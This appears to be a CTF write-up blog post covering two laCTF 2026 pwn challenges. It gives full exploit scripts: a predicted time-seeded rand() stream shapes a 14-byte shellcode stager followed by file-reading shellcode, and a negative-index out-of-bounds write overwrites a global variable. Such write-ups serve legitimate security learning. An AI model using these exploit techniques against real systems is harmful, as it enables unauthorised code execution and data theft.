@@ -1,0 +1,879 @@
+---
+layout: post
+title: "laCTF 2026 - Pwn"
+date: 2026-02-08
+image: /assets/.
+categories: ["laCTF"]
+tags: [pwn, ctf2026]
+---
+
+## ScrabASM
+
+### Intro
+
+Description: *Scrabble for ASM!*  
+But the moment I saw “tiles: 14” and “board: `0x13370000`”, I immediately pictured one thing: **this isn’t a word game, this is a shellcode game**.
+
+The twist is neat too: we *can’t* just type arbitrary bytes. We’re only given 14 random-byte “letters”, and one action: **swap** (reroll) one tile into the next random byte. So the question changes from:
+
+> “How do you write 14-byte shellcode?”  
+
+to:
+
+> “How do you make the RNG behave, so those 14 bytes are exactly right?”
+
+In this write-up I’ll walk from recon to the exploit that prints the flag.
+
+---
+
+### Recon: what’s in the folder?
+
+We get the binary + its source. Nice.
+
+```bash
+$ ls -la
+total 44
+drwxr-xr-x 2 root root  4096 Feb  7 21:25 .
+drwxr-xr-x 4 root root  4096 Feb  7 21:09 ..
+-rw-r--r-- 1 root root   134 Feb  4 14:20 Dockerfile
+-rwxr-xr-x 1 root root 16616 Feb  7 02:09 chall
+-rw-r--r-- 1 root root  2831 Feb  7 02:09 chall.c
+```
+
+The `Dockerfile` also says the binary runs in a jail and the flag is in `flag.txt`:
+
+```dockerfile
+FROM pwn.red/jail
+
+COPY --from=ubuntu:noble / /srv
+COPY chall /srv/app/run
+COPY flag.txt /srv/app/flag.txt
+RUN chmod 755 /srv/app/run
+```
+
+---
+
+### Peeking at the binary: protections & “CET” that force shellcode to behave
+
+First: file type and protections.
+
+```bash
+$ file chall
+chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b6e97f1b753083141a9f765a5582882de57e4a3d, for GNU/Linux 3.2.0, not stripped
+
+$ checksec --file=chall
+[*] '/home/hadespwnme/ctf/lactf/pwn/ScrabASM/chall'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+The important points:
+
+- `NX enabled` usually makes shellcode sad… **but** this program later `mmap`s its own RWX page.
+- `PIE enabled` makes code addresses random, but the board is fixed: `0x13370000`.
+- `IBT enabled` (part of Intel CET) means **indirect call/jmp must land on an `endbr64` instruction**. So our shellcode must start with `f3 0f 1e fa`.
+
+---
+
+### Runtime recon: Scrabble UI, “byte lottery” mechanics
+
+Run the binary:
+
+```bash
+$ ./chall
+
+    .=========================================.
+    |  +---+---+---+---+---+---+---+---+      |
+    |  | S | c | r | a | b | A | S | M |      |
+    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |
+    |  +---+---+---+---+---+---+---+---+      |
+    |                                         |
+    |   The word game where bytes are tiles   |
+    |     and the board runs your code!       |
+    '========================================='
+
+    Board: 0x13370000    Tiles: 14
+
+    Your starting tiles:
+    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
+    | 6f | 32 | 7f | 0f | d0 | 16 | 5e | 84 | 41 | 89 | 56 | 69 | 7f | 98 |
+    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
+      0    1    2    3    4    5    6    7    8    9   10   11   12   13
+
+    1) Swap a tile
+    2) Play!
+```
+
+There are 14 tiles (`HAND_SIZE=14`). The menu is only:
+
+- swap one tile (becomes a new random byte)
+- play (execute those 14 bytes as code)
+
+If this is a “game”, then we’re playing **probability**.
+
+---
+
+### Reading the source: the board really runs our bytes
+
+The key parts are `swap_tile()` and `play()`:
+
+```c
+// chall.c
+
+#define HAND_SIZE 14
+#define BOARD_ADDR 0x13370000UL
+#define BOARD_SIZE 0x1000
+
+void swap_tile(unsigned char *hand) {
+    ...
+    hand[idx] = rand() & 0xFF;   // <- ini satu-satunya cara kita “ngubah” byte
+    puts("    Tile swapped!");
+}
+
+void play(unsigned char *hand) {
+    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
+                       PROT_READ | PROT_WRITE | PROT_EXEC,
+                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    ...
+    memcpy(board, hand, HAND_SIZE);     // <- copy 14 byte
+    ((void (*)(void))board)();          // <- execute
+}
+
+int main() {
+    ...
+    srand(time(NULL));                  // <- seed time-based
+    for (int i = 0; i < HAND_SIZE; i++)
+        hand[i] = rand() & 0xFF;        // <- starting hand dari RNG juga
+    ...
+}
+```
+
+In plain terms: **the starting hand and every swap both come from `rand()`**, and the seed is just `time(NULL)`.
+
+That means if we can guess the seed… we can “see the future” of the bytes that will come out.
+
+---
+
+### Bonus: proof in ASM that the board is called via an indirect call
+
+`objdump` for `play()`:
+
+```bash
+$ objdump -d -M intel chall | sed -n '/<play>:/,/^$/p' | head -n 35
+0000000000001588 <play>:
+    1588:	f3 0f 1e fa          	endbr64
+    ...
+    15b3:	bf 00 00 37 13       	mov    edi,0x13370000
+    15b8:	e8 53 fb ff ff       	call   1110 <mmap@plt>
+    ...
+    1625:	ba 0e 00 00 00       	mov    edx,0xe
+    1630:	e8 2b fb ff ff       	call   1160 <memcpy@plt>
+    1635:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
+    1639:	ff d0                	call   rax
+```
+
+The important bits:
+
+- Mapping is always at `0x13370000` (MAP_FIXED).
+- Execution happens via `call rax` (indirect call) → **IBT is active** → shellcode *must* start with `endbr64`.
+
+---
+
+### Exploit core: “swap” isn’t random when the RNG is predictable
+
+The real problem isn’t “there’s RWX, just drop shellcode”, because we only get **14 bytes**, and even those start out random.
+
+So we build a 2-stage exploit:
+
+1) **Stage0 (14 bytes)**: a tiny stager that only does `read(0, board, 0x80)`.
+2) **Stage2 (~< 0x80 bytes)**: normal shellcode (ORW) to open `flag.txt`, read it, and write it to stdout.
+
+But to “spell” Stage0 into our hand, we have to:
+
+- recover the `time(NULL)` seed from the printed starting hand,
+- predict the sequence of future `rand() & 0xff` bytes,
+- and choose which index to swap each time so the RNG output “lands” in the byte position we need.
+
+---
+
+### Stage0: 14 bytes that only do `read()` (and must be `endbr64`)
+
+We need a 14-byte stager. This is the byte sequence I used:
+
+```text
+f3 0f 1e fa  89 c6  31 ff  b2 80  31 c0  0f 05
+```
+
+Disassembly:
+
+```python
+from pwn import context, disasm
+context.arch='amd64'
+stage0 = bytes.fromhex('f3 0f 1e fa 89 c6 31 ff b2 80 31 c0 0f 05')
+print(disasm(stage0))
+# Output:
+   0:   f3 0f 1e fa             endbr64
+   4:   89 c6                   mov    esi, eax
+   6:   31 ff                   xor    edi, edi
+   8:   b2 80                   mov    dl, 0x80
+   a:   31 c0                   xor    eax, eax
+   c:   0f 05                   syscall
+```
+
+Why this works:
+
+- When `play()` calls the board, register `RAX` holds the address of the function being called (`0x13370000`). That’s because the instruction is `call rax`.
+- `mov esi, eax` copies the low 32 bits of `RAX` into `RSI` → so `RSI = 0x13370000`.
+- `xor edi, edi` → `RDI = 0` (stdin).
+- `xor eax, eax` → syscall number `read` (SYS_read = 0).
+- `syscall` → read stage2 into the board.
+
+Small note: `mov dl, 0x80` only sets the low byte of `RDX`. In this environment it’s enough (upper bits happen to be 0), so the effective length becomes `0x80`.
+
+---
+
+### Stage2: ORW to print `flag.txt`
+
+After stage0 does `read()`, execution continues by “falling through” past stage0, so we place stage2 starting at byte 14.
+
+Stage2 (Intel syntax) looks like this:
+
+```asm
+; ORW shellcode: openat("flag.txt"), read, write, exit
+; - openat(AT_FDCWD=-100, "flag.txt", O_RDONLY=0)
+; - read(fd, rsp, 0x100)
+; - write(1, rsp, n)
+
+    push -100
+    pop  rdi                 ; rdi = AT_FDCWD
+    lea  rsi, [rip+path]     ; rsi = &"flag.txt"
+    xor  edx, edx            ; rdx = O_RDONLY
+    mov  eax, 257            ; rax = SYS_openat
+    syscall
+
+    mov  edi, eax            ; rdi = fd
+    mov  rsi, rsp            ; rsi = buf
+    mov  edx, 0x100          ; rdx = size
+    xor  eax, eax            ; rax = SYS_read
+    syscall
+
+    mov  edx, eax            ; rdx = bytes_read
+    push 1
+    pop  rdi                 ; rdi = stdout
+    mov  eax, 1              ; rax = SYS_write
+    syscall
+
+    xor  edi, edi
+    mov  eax, 60             ; SYS_exit
+    syscall
+
+path:
+    .ascii "flag.txt\0"
+```
+
+Why ORW (not `system("/bin/sh")`)?
+
+- In a pwn.red jail, the most stable approach is usually to directly **open/read/write** the flag file.
+- No need to rely on libc addresses / ROP (we already have an RWX page).
+
+---
+
+### Taming the RNG: recover the `time(NULL)` seed from the starting hand
+
+Because the program does:
+
+```c
+srand(time(NULL));
+for i in 0..13:
+    hand[i] = rand() & 0xff;
+```
+
+the printed starting hand is a *fingerprint* of the seed.
+
+The trick I used:
+
+1) Parse the 14 hand bytes from the banner.
+2) Brute-force the seed around the current time (e.g., +/- 2 days).
+3) For each candidate seed, generate the first 14 bytes of `rand() & 0xff` and compare.
+
+If it matches → seed found → we can predict the next bytes without waiting for “luck”.
+
+---
+
+### Solver: turning “Scrabble” into “Shellcode”
+
+
+Usage:
+
+```bash
+$ python3 solve.py --remote
+
+lactf{gg_y0u_sp3ll3d_sh3llc0d3}
+```
+
+Full code is below:
+
+```python
+#!/usr/bin/env python3
+"""
+ScrabASM (LACTF) solver.
+
+Idea:
+- The program seeds glibc `rand()` with `time(NULL)` and prints 14 random bytes (your hand).
+- You may "swap" a tile, which replaces one chosen index with the next `rand() & 0xff` byte.
+- When you press Play, the 14 bytes are copied to an RWX mapping at 0x13370000 and executed.
+
+Exploit:
+1) Recover the `time(NULL)` seed by brute-forcing near current time until the first 14 bytes match.
+2) Reproduce the full future RNG stream to plan swaps that sculpt the 14-byte hand into a tiny stager.
+3) The 14-byte stager does `read(0, 0x13370000, 0x80)` to load a bigger stage2 shellcode.
+4) Stage2 uses ORW (openat/read/write) to print `flag.txt`.
+"""
+
+import re
+import time
+
+from pwn import asm, context, remote, process
+
+
+context.update(arch="amd64", os="linux")
+
+
+HAND_SIZE = 14
+
+
+class GlibcRand:
+    """
+    Minimal clone of glibc's non-reentrant `random()` generator used by `rand()`.
+
+    glibc's `rand()` is effectively:
+      (int) __random()   // returns 31-bit value
+    and the state update is an additive feedback generator with degree 31 / separation 3.
+
+    We only need it to be byte-perfect for:
+      rand() & 0xff
+    """
+
+    DEG = 31
+    SEP = 3
+    MOD = 2147483647
+    MUL = 16807
+
+    def __init__(self, seed: int):
+        # This matches the initialization logic glibc uses for its TYPE_3 generator.
+        if seed == 0:
+            seed = 1
+        self.state = [0] * self.DEG
+        self.state[0] = seed
+        for i in range(1, self.DEG):
+            self.state[i] = (self.MUL * self.state[i - 1]) % self.MOD
+        self.f = self.SEP
+        self.r = 0
+        for _ in range(10 * self.DEG):
+            self.rand()
+
+    def rand(self) -> int:
+        # state[f] = state[f] + state[r]
+        # return state[f] >> 1
+        val = (self.state[self.f] + self.state[self.r]) & 0xFFFFFFFF
+        self.state[self.f] = val
+        res = (val >> 1) & 0x7FFFFFFF
+        self.f += 1
+        self.r += 1
+        if self.f >= self.DEG:
+            self.f = 0
+        if self.r >= self.DEG:
+            self.r = 0
+        return res
+
+
+def parse_hand(banner: bytes) -> list[int]:
+    # The hand is printed as: `| xx | yy | ... |` for 14 bytes.
+    m = re.search(rb"\|\s*([0-9a-f]{2})\s*\|(?:\s*([0-9a-f]{2})\s*\|){13}", banner)
+    if not m:
+        raise ValueError("failed to find hand bytes in banner")
+    # Extract all hex bytes between | ... |
+    hexes = re.findall(rb"\|\s*([0-9a-f]{2})\s*", banner)
+    if len(hexes) < HAND_SIZE:
+        raise ValueError(f"expected {HAND_SIZE} bytes, got {len(hexes)}")
+    return [int(x, 16) for x in hexes[:HAND_SIZE]]
+
+
+def recover_seed(hand: list[int], now: int, window: int = 172800) -> int:
+    # Brute-force `srand(time(NULL))` within +/- `window` seconds.
+    want = bytes(hand)
+    for seed in range(now - window, now + window + 1):
+        r = GlibcRand(seed)
+        got = bytes((r.rand() & 0xFF) for _ in range(HAND_SIZE))
+        if got == want:
+            return seed
+    raise ValueError("seed not found in window; expand window")
+
+
+def plan_swaps(seed: int, initial_hand: list[int], target: bytes, max_swaps: int = 20000) -> list[int]:
+    """
+    Given the RNG seed and the starting hand, compute which tile index to swap each turn
+    so that the final 14 bytes equal `target`.
+
+    Each swap consumes exactly one RNG byte: new_byte = rand() & 0xff.
+    We can choose WHICH index receives that new_byte.
+
+    Strategy:
+    - Track which target bytes are still missing (byte -> list of indices needing it).
+    - Maintain one "trash" index we don't care about for wasting RNG outputs.
+    - For each RNG byte:
+        - If it matches a needed target byte, assign it to one of the indices needing it.
+        - Otherwise, assign it to the trash index.
+    """
+    r = GlibcRand(seed)
+    # Consume RNG calls used for the initial hand.
+    for _ in range(HAND_SIZE):
+        r.rand()
+
+    hand = initial_hand[:]
+    remaining: dict[int, list[int]] = {}
+    for i in range(HAND_SIZE):
+        if hand[i] == target[i]:
+            continue
+        remaining.setdefault(target[i], []).append(i)
+
+    if not remaining:
+        return []
+
+    def pick_trash() -> int:
+        for idxs in remaining.values():
+            if idxs:
+                return idxs[-1]
+        raise RuntimeError("no remaining indices")
+
+    trash = pick_trash()
+    actions: list[int] = []
+
+    for _ in range(max_swaps):
+        b = r.rand() & 0xFF
+        idxs = remaining.get(b)
+        if idxs:
+            idx = idxs.pop()
+            fixed_this = True
+            if not idxs:
+                del remaining[b]
+        else:
+            idx = trash
+            fixed_this = False
+
+        hand[idx] = b
+        actions.append(idx)
+
+        if fixed_this and idx == trash and remaining:
+            trash = pick_trash()
+
+        if not remaining:
+            return actions
+
+    raise ValueError("too many swaps; increase max_swaps")
+
+
+def build_stage2() -> bytes:
+    # Stage0 is 14 bytes, so execution resumes at offset 14 after the stager `read()`.
+    # We send 0x80 bytes total, and place stage2 at +14 (first 14 bytes are NOPs).
+    stage2 = asm(
+        r"""
+        .intel_syntax noprefix
+
+        push -100
+        pop rdi                 /* AT_FDCWD */
+        lea rsi, [rip+path]
+        xor edx, edx            /* O_RDONLY */
+        mov eax, 257            /* SYS_openat */
+        syscall
+
+        mov edi, eax            /* fd */
+        mov rsi, rsp
+        mov edx, 0x100
+        xor eax, eax            /* SYS_read */
+        syscall
+
+        mov edx, eax            /* count */
+        push 1
+        pop rdi
+        mov eax, 1              /* SYS_write */
+        syscall
+
+        xor edi, edi
+        mov eax, 60             /* SYS_exit */
+        syscall
+
+        path:
+        .ascii "flag.txt\0"
+        """
+    )
+    blob = b"\x90" * HAND_SIZE + stage2
+    if len(blob) > 0x80:
+        raise ValueError(f"stage2 too large for stager read: {len(blob)} > 0x80")
+    return blob.ljust(0x80, b"\x90")
+
+
+def main():
+    import argparse
+
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--remote", action="store_true")
+    ap.add_argument("--host", default="chall.lac.tf")
+    ap.add_argument("--port", type=int, default=31338)
+    args = ap.parse_args()
+
+    if args.remote:
+        io = remote(args.host, args.port)
+    else:
+        io = process(["./chall"])
+
+    # 1) Parse the printed starting hand.
+    banner = io.recvuntil(b"> ")
+    hand = parse_hand(banner)
+
+    # 2) Recover the time-based seed and predict future RNG bytes.
+    now = int(time.time())
+    seed = recover_seed(hand, now)
+
+    # 3) Build a 14-byte stage0 stager (must start with ENDBR64 due to IBT).
+    #
+    # At the moment the board is called, RAX == 0x13370000 (the function pointer itself).
+    # We reuse it to set RSI = board and do a `read()` syscall.
+    #
+    # Stage0 bytes:
+    #   f3 0f 1e fa    endbr64
+    #   89 c6          mov esi, eax    ; rsi = 0x13370000
+    #   31 ff          xor edi, edi    ; rdi = 0
+    #   b2 80          mov dl, 0x80    ; rdx ~= 0x80 (good enough in this env)
+    #   31 c0          xor eax, eax    ; rax = SYS_read
+    #   0f 05          syscall
+    target = bytes.fromhex("f3 0f 1e fa 89 c6 31 ff b2 80 31 c0 0f 05")
+    swaps = plan_swaps(seed, hand, target)
+
+    # 4) Send swap commands to sculpt the hand, then press Play.
+    payload = b""
+    for idx in swaps:
+        payload += b"1\n" + str(idx).encode() + b"\n"
+    payload += b"2\n"
+
+    io.send(payload)
+    io.recvuntil(b"TRIPLE WORD SCORE!")
+
+    # 5) Stage0 executes and immediately reads stage2 from stdin.
+    io.send(build_stage2())
+    out = io.recvrepeat(2.0)
+    print(out.decode(errors="replace"))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+
+### Flag
+
+`lactf{gg_y0u_sp3ll3d_sh3llc0d3}`
+
+---
+
+## tic-tac-no
+
+### Intro
+
+They say tic-tac-toe played perfectly always ends in a draw. So when this challenge says, *“Can you be more perfect than my perfect bot?”*, your first instinct should be: “EZ”.
+
+But this is CTF pwn. So we don’t need to be smarter than minimax—we just need to be more **evil** than C.
+
+The goal is simple:
+
+- if we win (`winner == player`), the program will open `flag.txt` and print the flag.
+- if it’s a draw / we lose, we only get “Nice try”.
+
+And here, “winning” isn’t about strategy… it’s about **writing a byte to the wrong address**.
+
+---
+
+### Recon: what’s in the challenge?
+
+Check the folder contents:
+
+```bash
+$ ls
+Dockerfile
+chall
+chall.c
+```
+
+There’s the binary `chall` and source `chall.c` (nice: we can audit quickly).
+
+Run the classic recon to see file type + protections:
+
+```bash
+$ file chall
+chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7af0424894612d9b72f91f4435605cb473c32b48, for GNU/Linux 3.2.0, not stripped
+
+$ checksec --file=chall
+[*] '/home/hadespwnme/ctf/lactf/pwn/tic-tac-no/chall'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+Important notes for readers who are still learning:
+
+- **PIE enabled**: runtime addresses are randomized (ASLR), but *offsets between symbols inside the binary stay the same*.
+- **No canary**: stack overflows are easier, but… we don’t even need an overflow here.
+- **NX enabled**: shellcode injection is hard, but this exploit is only “logic + memory bug”.
+
+---
+
+### Looking at the source: the “should be safe” that’s actually inverted
+
+The core user interaction is in `playerMove()`:
+
+```c
+void playerMove() {
+   int x, y;
+   do{
+      printf("Enter row #(1-3): ");
+      scanf("%d", &x);
+      printf("Enter column #(1-3): ");
+      scanf("%d", &y);
+      int index = (x-1)*3+(y-1);
+      if(index >= 0 && index < 9 && board[index] != ' '){
+         printf("Invalid move.\n");
+      }else{
+         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
+         break;
+      }
+   }while(1);
+}
+```
+
+That comment is *very* confident: *Should be safe… user cannot overwrite tiles…*
+
+The problem: the `if` only rejects a **narrow case**:
+
+> “index is valid and the tile is already occupied”
+
+But the cases that should be rejected are actually these:
+
+- index **outside** 0..8 (negative or >8)
+- index valid but tile **empty** (this is the valid move)
+
+Because the logic is inverted, weird input like `x = -7` falls into the `else`… and the program still does:
+
+> `board[index] = player;`
+
+If `index` is negative → that isn’t “the board”, that’s “memory before the board”.
+
+---
+
+### Bonus: why this is truly an OOB write
+
+Sometimes source can be misleading (or we want to be sure the compiled binary really has the same bug). So let’s peek at the `playerMove` disassembly:
+
+```bash
+$ objdump -d -M intel chall | sed -n '/14a9:/,/14f9:/p'
+    14a9:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
+    14ac:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
+    14b0:	78 2e                	js     14e0 <playerMove+0xb1>
+    14b2:	83 7d fc 08          	cmp    DWORD PTR [rbp-0x4],0x8
+    14b6:	7f 28                	jg     14e0 <playerMove+0xb1>
+    14b8:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
+    14bb:	48 98                	cdqe
+    14bd:	48 8d 15 a4 2b 00 00 	lea    rdx,[rip+0x2ba4]        # 4068 <board>
+    14c4:	0f b6 04 10          	movzx  eax,BYTE PTR [rax+rdx*1]
+    14c8:	3c 20                	cmp    al,0x20
+    14ca:	74 14                	je     14e0 <playerMove+0xb1>
+    14cc:	48 8d 05 31 0c 00 00 	lea    rax,[rip+0xc31]        # 2104 <_IO_stdin_used+0x104>
+    14d3:	48 89 c7             	mov    rdi,rax
+    14d6:	e8 65 fb ff ff       	call   1040 <puts@plt>
+    14db:	e9 57 ff ff ff       	jmp    1437 <playerMove+0x8>
+    14e0:	0f b6 15 69 2b 00 00 	movzx  edx,BYTE PTR [rip+0x2b69]        # 4050 <player>
+    14e7:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
+    14ea:	48 98                	cdqe
+    14ec:	48 8d 0d 75 2b 00 00 	lea    rcx,[rip+0x2b75]        # 4068 <board>
+    14f3:	88 14 08             	mov    BYTE PTR [rax+rcx*1],dl
+    14f6:	90                   	nop
+    14f7:	90                   	nop
+    14f8:	c9                   	leave
+    14f9:	c3                   	ret
+```
+
+You can see it clearly:
+
+- if `index < 0` (`js`) or `index > 8` (`jg`) → it jumps to label `14e0`, which actually **performs the write**.
+
+#### Pseudocode “translated” from the ASM
+
+Roughly:
+
+```text
+index = (x-1)*3 + (y-1)
+
+if (index in [0..8] AND board[index] != ' '):
+    print("Invalid move")
+    retry
+else:
+    board[index] = player    // <- ini termasuk index negatif / >8 (OOB!)
+    return
+```
+
+That’s not a “small bug”. It’s a primitive:
+
+> **arbitrary out-of-bounds byte write** (near the global area).
+
+---
+
+### Exploit core: hit the global `computer` variable using a negative index
+
+Because `board` is a global array, writing `board[index]` is effectively:
+
+> write 1 byte to address `&board[0] + index`
+
+We need to know: *what’s before `board`?*
+
+Check global symbols:
+
+```bash
+$ nm -n chall | egrep ' player$| computer$| board$'
+0000000000004050 D player
+0000000000004051 D computer
+0000000000004068 B board
+```
+
+Meaning (remember: this is a PIE offset, not an absolute runtime address):
+
+- `player` is at `0x4050` (byte `'X'`)
+- `computer` is at `0x4051` (byte `'O'`)
+- `board` starts at `0x4068` (9 bytes)
+
+The difference we’re targeting:
+
+```text
+index_target = &computer - &board
+             = 0x4051 - 0x4068
+             = -0x17
+             = -23
+```
+
+So if we make `index = -23`, the statement `board[index] = player` turns into:
+
+> `computer = 'X'`
+
+And once `computer` becomes `'X'`, that “perfect” bot… suddenly plays with our symbol too.
+
+#### Turning `index` into (row, col)
+
+The program computes:
+
+```text
+index = (row-1)*3 + (col-1)
+```
+
+We want `index = -23`.
+
+Pick:
+
+- `row = -7` → `(row-1)*3 = (-8)*3 = -24`
+- `col = 2`  → `(col-1) = 1`
+
+So:
+
+```text
+index = -24 + 1 = -23
+```
+
+And that immediately writes into `computer`.
+
+---
+
+### Solver: minimal input, maximum damage
+
+We wrap the exploit with pwntools.
+
+```python
+#!/usr/bin/env python3
+import os
+import re
+import stat
+from pwn import *
+
+
+def main():
+    host = args.HOST or "chall.lac.tf"
+    port = int(args.PORT or 30001)
+
+    elf = ELF("./chall", checksec=False)
+    context.binary = elf
+    context.log_level = args.LOG_LEVEL or "info"
+
+    if args.LOCAL:
+        st = os.stat(context.binary.path)
+        if not (st.st_mode & stat.S_IXUSR):
+            os.chmod(context.binary.path, st.st_mode | stat.S_IXUSR)
+        io = process(context.binary.path)
+    else:
+        io = remote(host, port)
+
+    # Bug: playerMove() allows out-of-bounds indices. Compute an index that
+    # aliases the global `computer` char and overwrite it with `player` ('X').
+    idx = elf.sym["computer"] - elf.sym["board"]  # negative
+    x = idx // 3 + 1
+    y = idx % 3 + 1
+    io.sendlineafter(b"Enter row #(1-3): ", str(x).encode())
+    io.sendlineafter(b"Enter column #(1-3): ", str(y).encode())
+
+    # Put an X in the top-left; the bot will complete the diagonal and "we" win.
+    io.sendlineafter(b"Enter row #(1-3): ", b"1")
+    io.sendlineafter(b"Enter column #(1-3): ", b"1")
+
+    if args.INTERACTIVE:
+        io.interactive()
+        return
+
+    data = io.recvall(timeout=3) or b""
+    m = re.search(rb"lactf\\{[^}]+\\}", data)
+    if m:
+        print(m.group(0).decode(errors="replace"))
+    else:
+        # Fallback: print last non-empty line (often the flag)
+        lines = [ln for ln in data.splitlines() if ln.strip()]
+        if lines:
+            print(lines[-1].decode(errors="replace"))
+        else:
+            log.error("No output received; try INTERACTIVE=1")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Test remote:
+
+```bash
+$ python3 solve.py LOG_LEVEL=error
+[x] Opening connection to chall.lac.tf on port 30001
+[x] Opening connection to chall.lac.tf on port 30001: Trying 34.169.138.235
+[+] Opening connection to chall.lac.tf on port 30001: Done
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 173B
+[+] Receiving all data: Done (173B)
+[*] Closed connection to chall.lac.tf port 30001
+lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
+```
+
+### Flag
+
+`lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`
